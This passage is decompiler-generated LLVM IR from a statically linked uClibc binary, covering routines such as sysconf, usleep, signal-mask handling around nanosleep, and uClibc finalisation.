  store i32 %v2_80517fc, i32* %stack_var_-460, align 4
  %v4_805181c = call i32 @__sigismember(i32 %v2_80517fc, i32 17, i32 %v4_8051807, i32 %v4_8051807)
  store i32 %v4_805181c, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8051829 = icmp eq i32 %v4_805181c, 0
  br i1 %v1_8051829, label %dec_label_pc_805183d.preheader, label %dec_label_pc_80518e5

dec_label_pc_805183d.preheader:                   ; preds = %dec_label_pc_8051817
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051832

dec_label_pc_8051832:                             ; preds = %dec_label_pc_8051832.dec_label_pc_8051832_crit_edge, %dec_label_pc_805183d.preheader
  %v0_8051832 = phi i32 [ %v15_80517a9, %dec_label_pc_805183d.preheader ], [ %v0_8051832.pre, %dec_label_pc_8051832.dec_label_pc_8051832_crit_edge ]
  %v1_805183d26 = phi i32 [ 31, %dec_label_pc_805183d.preheader ], [ %v1_805183d, %dec_label_pc_8051832.dec_label_pc_8051832_crit_edge ]
  %v2_8051832 = mul i32 %v1_805183d26, 4
  %v3_8051832 = add i32 %v2_8051832, 292
  %v4_8051832 = add i32 %v3_8051832, %v0_8051832
  %v5_8051832 = inttoptr i32 %v4_8051832 to i32*
  store i32 0, i32* %v5_8051832, align 4
  %v0_805183d.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_805183d = add i32 %v0_805183d.pre, -1
  %v9_805183d = icmp slt i32 %v1_805183d, 0
  store i32 %v1_805183d, i32* %edx.global-to-local, align 4
  %v1_805183e = icmp eq i1 %v9_805183d, false
  br i1 %v1_805183e, label %dec_label_pc_8051832.dec_label_pc_8051832_crit_edge, label %dec_label_pc_8051840

dec_label_pc_8051832.dec_label_pc_8051832_crit_edge: ; preds = %dec_label_pc_8051832
  %v0_8051832.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051832

dec_label_pc_8051840:                             ; preds = %dec_label_pc_8051832
  store i32 %v2_80517e3, i32* %eax.global-to-local, align 4
  store i32 %v2_80517e3, i32* %stack_var_-460, align 4
  %v4_805184c = call i32 @__sigaddset(i32 %v2_80517e3, i32 17, i32 0, i32 0)
  store i32 %v4_805184c, i32* %eax.global-to-local, align 4
  %v2_8051854 = icmp slt i32 %v4_805184c, 0
  br i1 %v2_8051854, label %dec_label_pc_805191b, label %dec_label_pc_805185c

dec_label_pc_805185c:                             ; preds = %dec_label_pc_8051840
  %v2_805185d = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_805185d, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8051866 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_805185d)
  store i32 %v4_8051866, i32* %eax.global-to-local, align 4
  %v2_805186e = icmp slt i32 %v4_8051866, 0
  %v1_8051870 = icmp eq i1 %v2_805186e, false
  br i1 %v1_8051870, label %dec_label_pc_805189a, label %dec_label_pc_8051872

dec_label_pc_8051872:                             ; preds = %dec_label_pc_805185c
  %v0_8051872 = load i32, i32* %stack_var_-460, align 4
  %v1_8051872 = call i32 @__errno_location(i32 %v0_8051872)
  store i32 %v1_8051872, i32* %eax.global-to-local, align 4
  %v1_8051877 = inttoptr i32 %v1_8051872 to i32*
  %v2_8051877 = load i32, i32* %v1_8051877, align 4
  store i32 %v2_8051877, i32* @esi, align 4
  store i32 %v1_8051872, i32* @ebx, align 4
  store i32 %v2_80517fc, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051888 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051888 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8051888, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8051893 = load i32, i32* @esi, align 4
  %v1_8051893 = load i32, i32* @ebx, align 4
  %v2_8051893 = inttoptr i32 %v1_8051893 to i32*
  store i32 %v0_8051893, i32* %v2_8051893, align 4
  %v0_8051928.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805191e

dec_label_pc_805189a:                             ; preds = %dec_label_pc_805185c
  %v3_805189a = load i32, i32* %stack_var_-420, align 4
  %v12_805189a = icmp eq i32 %v3_805189a, 1
  %v2_80518a6 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80518a6, i32* @ebx, align 4
  %v1_80518ad = icmp eq i1 %v12_805189a, false
  br i1 %v1_80518ad, label %dec_label_pc_80518d4, label %dec_label_pc_80518af

dec_label_pc_80518af:                             ; preds = %dec_label_pc_805189a
  store i32 %v2_80518a6, i32* %stack_var_-460, align 4
  %v2_80518b3 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_80518b3 = call i32 @__libc_nanosleep(%timespec* %v2_80518b3, i32 %v2_80518a6)
  store i32 %v3_80518b3, i32* %eax.global-to-local, align 4
  store i32 %v3_80518b3, i32* @edi, align 4
  %v1_80518ba = call i32 @__errno_location(i32 %v2_80518a6)
  store i32 %v1_80518ba, i32* %eax.global-to-local, align 4
  %v1_80518c2 = inttoptr i32 %v1_80518ba to i32*
  %v2_80518c2 = load i32, i32* %v1_80518c2, align 4
  store i32 %v2_80518c2, i32* @esi, align 4
  store i32 %v1_80518ba, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80518cb = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80518cb = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80518cb, i32 0)
  store i32 %v4_80518cb, i32* %eax.global-to-local, align 4
  %v0_80518d0 = load i32, i32* @esi, align 4
  %v1_80518d0 = load i32, i32* @ebx, align 4
  %v2_80518d0 = inttoptr i32 %v1_80518d0 to i32*
  store i32 %v0_80518d0, i32* %v2_80518d0, align 4
  %v0_80518fa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80518f7

dec_label_pc_80518d4:                             ; preds = %dec_label_pc_805189a
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80518da = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80518da = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80518da, i32 0)
  store i32 %v4_80518da, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80518f0

dec_label_pc_80518e5:                             ; preds = %dec_label_pc_8051817
  %v2_80518e7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80518e7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80518f0

dec_label_pc_80518f0:                             ; preds = %dec_label_pc_80518d4, %dec_label_pc_80518e5
  %storemerge3.pre-phi = phi i32 [ %v2_80518a6, %dec_label_pc_80518d4 ], [ %v2_80518e7, %dec_label_pc_80518e5 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_80518f0 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_80518f0 = call i32 @__libc_nanosleep(%timespec* %v2_80518f0, i32 %storemerge3.pre-phi)
  store i32 %v3_80518f0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80518f7

dec_label_pc_80518f7:                             ; preds = %dec_label_pc_80518af, %dec_label_pc_80518f0
  %v0_80518fa = phi i32 [ %v0_80518fa.pre, %dec_label_pc_80518af ], [ %v3_80518f0, %dec_label_pc_80518f0 ]
  %v1_80518fa = icmp eq i32 %v0_80518fa, 0
  br i1 %v1_80518fa, label %dec_label_pc_8051917, label %dec_label_pc_80518fe

dec_label_pc_80518fe:                             ; preds = %dec_label_pc_80518f7
  %v4_805190e = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_805190e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805191e

dec_label_pc_8051917:                             ; preds = %entry, %dec_label_pc_80518f7
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805191e

dec_label_pc_805191b:                             ; preds = %dec_label_pc_8051840, %dec_label_pc_80517fb, %dec_label_pc_80517cd
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805191e

dec_label_pc_805191e:                             ; preds = %dec_label_pc_8051917, %dec_label_pc_80518fe, %dec_label_pc_8051872, %dec_label_pc_805191b
  %v0_8051928 = phi i32 [ 0, %dec_label_pc_8051917 ], [ %v4_805190e, %dec_label_pc_80518fe ], [ %v0_8051928.pre, %dec_label_pc_8051872 ], [ -1, %dec_label_pc_805191b ]
  store i32 %v0_80517a8, i32* @ebx, align 4
  store i32 %v0_80517a7, i32* @esi, align 4
  store i32 %v0_80517a6, i32* @edi, align 4
  ret i32 %v0_8051928

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_80518ba, { 1, 0, 2 }
  uselistorder i32 %v2_80518a6, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_805183d, { 2, 1, 0 }
  uselistorder i32 %v2_80517fc, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_80517e3, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_80517ca, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805191e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051917, { 1, 0 }
  uselistorder label %dec_label_pc_80518f7, { 1, 0 }
  uselistorder label %dec_label_pc_80518f0, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_805194b [
    i32 0, label %dec_label_pc_805195b
    i32 1, label %dec_label_pc_8051a40
    i32 2, label %dec_label_pc_8051965
    i32 3, label %dec_label_pc_805196f
    i32 4, label %dec_label_pc_8051979
    i32 5, label %dec_label_pc_8051a0f
    i32 6, label %dec_label_pc_8051981
    i32 7, label %dec_label_pc_8051941
    i32 8, label %dec_label_pc_8051941
    i32 9, label %dec_label_pc_8051941
    i32 10, label %dec_label_pc_8051941
    i32 11, label %dec_label_pc_8051941
    i32 12, label %dec_label_pc_8051941
    i32 13, label %dec_label_pc_8051941
    i32 14, label %dec_label_pc_8051941
    i32 15, label %dec_label_pc_8051941
    i32 16, label %dec_label_pc_8051941
    i32 17, label %dec_label_pc_8051941
    i32 18, label %dec_label_pc_8051941
    i32 19, label %dec_label_pc_8051941
    i32 20, label %dec_label_pc_8051941
    i32 21, label %dec_label_pc_8051941
    i32 22, label %dec_label_pc_8051941
    i32 23, label %dec_label_pc_8051a40
    i32 24, label %dec_label_pc_8051a40
    i32 25, label %dec_label_pc_8051a4c
    i32 26, label %dec_label_pc_8051a1d
    i32 27, label %dec_label_pc_8051a40
    i32 28, label %dec_label_pc_8051993
    i32 29, label %dec_label_pc_8051a16
    i32 30, label %dec_label_pc_805198b
    i32 31, label %dec_label_pc_8051a2b
    i32 32, label %dec_label_pc_8051a40
    i32 33, label %dec_label_pc_8051a40
    i32 34, label %dec_label_pc_8051a40
    i32 35, label %dec_label_pc_8051a24
    i32 36, label %dec_label_pc_8051a53
    i32 37, label %dec_label_pc_8051a5a
    i32 38, label %dec_label_pc_8051a53
    i32 39, label %dec_label_pc_805199d
    i32 40, label %dec_label_pc_8051a61
    i32 41, label %dec_label_pc_8051a40
    i32 42, label %dec_label_pc_8051a2b
    i32 43, label %dec_label_pc_8051a5a
    i32 44, label %dec_label_pc_8051a68
    i32 45, label %dec_label_pc_8051a5a
    i32 46, label %dec_label_pc_8051a16
    i32 47, label %dec_label_pc_8051a16
    i32 48, label %dec_label_pc_8051a16
    i32 49, label %dec_label_pc_8051a40
    i32 50, label %dec_label_pc_8051a40
    i32 51, label %dec_label_pc_8051a16
    i32 52, label %dec_label_pc_8051a16
    i32 53, label %dec_label_pc_8051a40
    i32 54, label %dec_label_pc_8051a40
    i32 55, label %dec_label_pc_8051a40
    i32 56, label %dec_label_pc_8051a40
    i32 57, label %dec_label_pc_8051a40
    i32 58, label %dec_label_pc_8051a40
    i32 59, label %dec_label_pc_8051a40
    i32 60, label %dec_label_pc_8051a40
    i32 61, label %dec_label_pc_8051a40
    i32 62, label %dec_label_pc_8051a40
    i32 63, label %dec_label_pc_8051a40
    i32 64, label %dec_label_pc_8051a40
    i32 65, label %dec_label_pc_8051a40
    i32 66, label %dec_label_pc_8051a40
    i32 67, label %dec_label_pc_8051941
    i32 68, label %dec_label_pc_8051941
    i32 69, label %dec_label_pc_8051a24
    i32 70, label %dec_label_pc_8051a24
    i32 71, label %dec_label_pc_8051a24
    i32 72, label %dec_label_pc_8051a2b
    i32 73, label %dec_label_pc_8051a32
    i32 74, label %dec_label_pc_8051a39
    i32 75, label %dec_label_pc_80519a7
    i32 76, label %dec_label_pc_8051a39
    i32 77, label %dec_label_pc_8051941
    i32 78, label %dec_label_pc_8051941
    i32 79, label %dec_label_pc_8051941
    i32 80, label %dec_label_pc_8051941
    i32 81, label %dec_label_pc_8051941
    i32 82, label %dec_label_pc_8051941
    i32 83, label %dec_label_pc_8051941
    i32 84, label %dec_label_pc_8051941
    i32 85, label %dec_label_pc_8051a40
    i32 86, label %dec_label_pc_8051a40
    i32 87, label %dec_label_pc_8051a1d
    i32 88, label %dec_label_pc_80519b1
    i32 89, label %dec_label_pc_80519bb
    i32 90, label %dec_label_pc_8051a32
    i32 91, label %dec_label_pc_8051941
    i32 92, label %dec_label_pc_8051941
    i32 93, label %dec_label_pc_8051941
    i32 94, label %dec_label_pc_8051941
    i32 95, label %dec_label_pc_8051a16
    i32 96, label %dec_label_pc_8051a40
    i32 97, label %dec_label_pc_8051a40
    i32 98, label %dec_label_pc_8051941
    i32 99, label %dec_label_pc_8051941
    i32 100, label %dec_label_pc_8051941
    i32 101, label %dec_label_pc_80519c5
    i32 102, label %dec_label_pc_8051a08
    i32 103, label %dec_label_pc_8051a45
    i32 104, label %dec_label_pc_8051a1d
    i32 105, label %dec_label_pc_80519cf
    i32 106, label %dec_label_pc_8051a2b
    i32 107, label %dec_label_pc_8051a2b
    i32 108, label %dec_label_pc_8051a0f
    i32 109, label %dec_label_pc_8051a4c
    i32 110, label %dec_label_pc_8051a68
    i32 111, label %dec_label_pc_8051a08
    i32 112, label %dec_label_pc_8051a45
    i32 113, label %dec_label_pc_8051a68
    i32 114, label %dec_label_pc_80519d9
    i32 115, label %dec_label_pc_8051a61
    i32 116, label %dec_label_pc_8051a40
    i32 117, label %dec_label_pc_8051a40
    i32 118, label %dec_label_pc_80519e3
    i32 119, label %dec_label_pc_80519ed
    i32 120, label %dec_label_pc_8051a5a
    i32 121, label %dec_label_pc_8051a1d
    i32 122, label %dec_label_pc_8051a1d
    i32 123, label %dec_label_pc_8051a1d
    i32 124, label %dec_label_pc_8051a1d
    i32 125, label %dec_label_pc_8051941
    i32 126, label %dec_label_pc_8051941
    i32 127, label %dec_label_pc_8051a40
    i32 128, label %dec_label_pc_8051a40
    i32 129, label %dec_label_pc_8051941
    i32 130, label %dec_label_pc_8051941
    i32 131, label %dec_label_pc_8051a40
    i32 149, label %dec_label_pc_80519f4
  ]

dec_label_pc_8051941:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_805194b:                             ; preds = %entry
  %v1_805194b = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8051950 = inttoptr i32 %v1_805194b to i32*
  store i32 22, i32* %v1_8051950, align 4
  br label %dec_label_pc_8051a40

dec_label_pc_805195b:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051965:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_805196f:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051979:                             ; preds = %entry
  %v0_805197c = call i32 @getdtablesize()
  br label %dec_label_pc_8051981

dec_label_pc_8051981:                             ; preds = %entry, %dec_label_pc_8051979
  br label %dec_label_pc_8051a6d

dec_label_pc_805198b:                             ; preds = %entry
  %v3_805198e = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8051993

dec_label_pc_8051993:                             ; preds = %entry, %dec_label_pc_805198b
  br label %dec_label_pc_8051a6d

dec_label_pc_805199d:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_80519a7:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_80519b1:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_80519bb:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_80519c5:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_80519cf:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_80519d9:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_80519e3:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_80519ed:                             ; preds = %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_80519f4:                             ; preds = %entry
  %v5_80519fa = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8051a02 = icmp slt i32 %v5_80519fa, 0
  %v1_8051a04 = icmp eq i1 %v2_8051a02, false
  br i1 %v1_8051a04, label %dec_label_pc_8051a16, label %dec_label_pc_8051a40

dec_label_pc_8051a08:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a0f:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a16:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80519f4
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a1d:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a24:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a2b:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a32:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a39:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a40:                             ; preds = %dec_label_pc_80519f4, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_805194b
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a45:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a4c:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a53:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a5a:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a61:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a68:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8051a6d

dec_label_pc_8051a6d:                             ; preds = %dec_label_pc_8051a61, %dec_label_pc_8051a5a, %dec_label_pc_8051a53, %dec_label_pc_8051a4c, %dec_label_pc_8051a45, %dec_label_pc_8051a39, %dec_label_pc_8051a32, %dec_label_pc_8051a2b, %dec_label_pc_8051a24, %dec_label_pc_8051a1d, %dec_label_pc_8051a0f, %dec_label_pc_8051a08, %dec_label_pc_8051a16, %dec_label_pc_80519ed, %dec_label_pc_80519e3, %dec_label_pc_80519d9, %dec_label_pc_80519cf, %dec_label_pc_80519c5, %dec_label_pc_80519bb, %dec_label_pc_80519b1, %dec_label_pc_80519a7, %dec_label_pc_805199d, %dec_label_pc_8051993, %dec_label_pc_8051981, %dec_label_pc_805196f, %dec_label_pc_8051965, %dec_label_pc_805195b, %dec_label_pc_8051941, %dec_label_pc_8051a40, %dec_label_pc_8051a68
  %v0_8051a70 = phi i32 [ 255, %dec_label_pc_8051a61 ], [ 2048, %dec_label_pc_8051a5a ], [ 99, %dec_label_pc_8051a53 ], [ 20, %dec_label_pc_8051a4c ], [ -128, %dec_label_pc_8051a45 ], [ 1024, %dec_label_pc_8051a39 ], [ 4, %dec_label_pc_8051a32 ], [ 32, %dec_label_pc_8051a2b ], [ 256, %dec_label_pc_8051a24 ], [ 2147483647, %dec_label_pc_8051a1d ], [ 16, %dec_label_pc_8051a0f ], [ 127, %dec_label_pc_8051a08 ], [ 200112, %dec_label_pc_8051a16 ], [ 9, %dec_label_pc_80519ed ], [ 65535, %dec_label_pc_80519e3 ], [ -32768, %dec_label_pc_80519d9 ], [ -2147483648, %dec_label_pc_80519cf ], [ 8, %dec_label_pc_80519c5 ], [ 500, %dec_label_pc_80519bb ], [ 4096, %dec_label_pc_80519b1 ], [ 16384, %dec_label_pc_80519a7 ], [ 1000, %dec_label_pc_805199d ], [ 32768, %dec_label_pc_8051993 ], [ 6, %dec_label_pc_8051981 ], [ 65536, %dec_label_pc_805196f ], [ 100, %dec_label_pc_8051965 ], [ 131072, %dec_label_pc_805195b ], [ 1, %dec_label_pc_8051941 ], [ -1, %dec_label_pc_8051a40 ], [ 32767, %dec_label_pc_8051a68 ]
  ret i32 %v0_8051a70

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 2, 0, 1, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 9, 0, 1, 2, 8 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 115, { 2, 0, 1 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 65, { 2, 1, 0 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 49, { 3, 2, 0, 1 }
  uselistorder i32 39, { 2, 0, 1 }
  uselistorder i32 38, { 1, 2, 0 }
  uselistorder i32 30, { 7, 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 26, { 2, 1, 0 }
  uselistorder i32 19, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051a6d, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8051a40, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8051a16, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051993, { 1, 0 }
  uselistorder label %dec_label_pc_8051981, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_8051a7c = trunc i64 %arg1 to i32
  %div = udiv i32 %v4_8051a7c, 1000000
  store i32 %div, i32* %stack_var_-8, align 4
  %v2_8051a9b = bitcast i32* %stack_var_-8 to %timespec*
  %v3_8051a9b = call i32 @__libc_nanosleep(%timespec* %v2_8051a9b, i32 0)
  ret i32 %v3_8051a9b

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
  uselistorder i32 1000000, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051aa4 = load i32, i32* @ebx, align 4
  store i32 %v0_8051aa4, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059668.221 to i32), i32 -134583912), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059668.221 to i32), i32 -134583912), i32 2), i32 0), label %dec_label_pc_8051ab8, label %dec_label_pc_8051ac5

dec_label_pc_8051ab8:                             ; preds = %entry, %dec_label_pc_8051ab8
  %v1_8051abf8 = phi i32 [ %v1_8051abf, %dec_label_pc_8051ab8 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059668.221 to i32), i32 -134583912), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8051abf.222 to i32), i32* %stack_var_-16, align 4
  %v5_8051ab8 = mul i32 %v1_8051abf8, 4
  %v6_8051ab8 = add i32 %v5_8051ab8, ptrtoint (i32* @global_var_8059668.221 to i32)
  %v7_8051ab8 = inttoptr i32 %v6_8051ab8 to i32*
  %v8_8051ab8 = load i32, i32* %v7_8051ab8, align 4
  call void @__pseudo_call(i32 %v8_8051ab8)
  %v0_8051abf.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051abf = add i32 %v0_8051abf.pre, -1
  store i32 %v1_8051abf, i32* %ebx.global-to-local, align 4
  %v10_8051ac0 = icmp eq i32 %v0_8051abf.pre, 0
  %v1_8051ac3 = icmp eq i1 %v10_8051ac0, false
  br i1 %v1_8051ac3, label %dec_label_pc_8051ab8, label %dec_label_pc_8051ac5

dec_label_pc_8051ac5:                             ; preds = %dec_label_pc_8051ab8, %entry
  %v0_8051ac5 = load i32, i32* @global_var_8060934.223, align 4
  %v1_8051aca = icmp eq i32 %v0_8051ac5, 0
  br i1 %v1_8051aca, label %dec_label_pc_8051ad0, label %dec_label_pc_8051ace

dec_label_pc_8051ace:                             ; preds = %dec_label_pc_8051ac5
  %v0_8051ace = load i32, i32* %stack_var_-16, align 4
  %v1_8051ace = call i32 @unknown_0(i32 %v0_8051ace)
  br label %dec_label_pc_8051ad0

dec_label_pc_8051ad0:                             ; preds = %dec_label_pc_8051ace, %dec_label_pc_8051ac5
  %v0_8051ad0 = load i32, i32* @global_var_8060938.224, align 8
  %v1_8051ad6 = icmp eq i32 %v0_8051ad0, 0
  br i1 %v1_8051ad6, label %dec_label_pc_8051adf, label %dec_label_pc_8051ada

dec_label_pc_8051ada:                             ; preds = %dec_label_pc_8051ad0
  %v2_8051ada = load i32, i32* %stack_var_-16, align 4
  %v1_8051add = call i32 @unknown_0(i32 %v2_8051ada)
  br label %dec_label_pc_8051adf

dec_label_pc_8051adf:                             ; preds = %dec_label_pc_8051ada, %dec_label_pc_8051ad0
  %v2_8051adf = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8051adf

; uselistorder directives
  uselistorder i32 %v1_8051abf, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051ab8, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8051ae6 = load i32, i32* @eax, align 4
  ret i32 %v0_8051ae6
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ae7 = load i32, i32* @esi, align 4
  %v0_8051ae8 = load i32, i32* @eax, align 4
  store i32 %v0_8051ae8, i32* @esi, align 4
  %v0_8051aea = load i32, i32* @ebx, align 4
  store i32 %v0_8051aea, i32* %stack_var_-8, align 4
  %v0_8051aeb = load i32, i32* @edx, align 4
  store i32 %v0_8051aeb, i32* @ebx, align 4
  %v4_8051af3 = call i32 @__libc_fcntl(i32 %v0_8051ae8, i32 1, i32 %tmp6)
  %v8_8051afb = icmp eq i32 %v4_8051af3, -1
  %v1_8051afc = icmp eq i1 %v8_8051afb, false
  br i1 %v1_8051afc, label %dec_label_pc_8051b17, label %dec_label_pc_8051afe

dec_label_pc_8051afe:                             ; preds = %entry
  %v0_8051b00 = load i32, i32* @ebx, align 4
